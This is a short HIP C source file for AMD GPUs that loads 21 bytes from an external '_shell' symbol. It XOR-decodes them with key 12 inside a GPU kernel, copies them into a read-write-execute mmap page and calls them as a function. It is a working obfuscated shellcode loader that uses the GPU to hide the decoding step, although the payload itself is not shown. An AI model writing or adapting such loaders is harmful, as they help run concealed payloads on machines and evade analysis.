#include <stdio.h>
#include <sys/mman.h>
#include <hip/hip_runtime.h>

#define len 21

__global__ void decrypt(unsigned char *code){

  int indx = threadIdx.x;
  code[indx] ^= 12;


}

extern "C" void _shell();

int main(void){

  unsigned char *p = (unsigned char*)_shell; 
  unsigned char *d_shell,*h_shell;

  h_shell = (unsigned char *)malloc(sizeof(char)*len);

  int i;
  for(i=0;i<len;i++){
    h_shell[i] = *p;
    p++;
  }
  hipMalloc((void **) &d_shell, sizeof(char)*len);
  hipMemcpy(d_shell, h_shell, sizeof(char)*len, hipMemcpyHostToDevice);
  decrypt<<<1,len>>>(d_shell);
  hipMemcpy(h_shell, d_shell, sizeof(char)*len, hipMemcpyDeviceToHost);
  hipFree(d_shell);
  char *d=(char *)mmap(NULL,len,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);
    
  memcpy(d,h_shell,len);

  ((void(*)(void))d)();


}
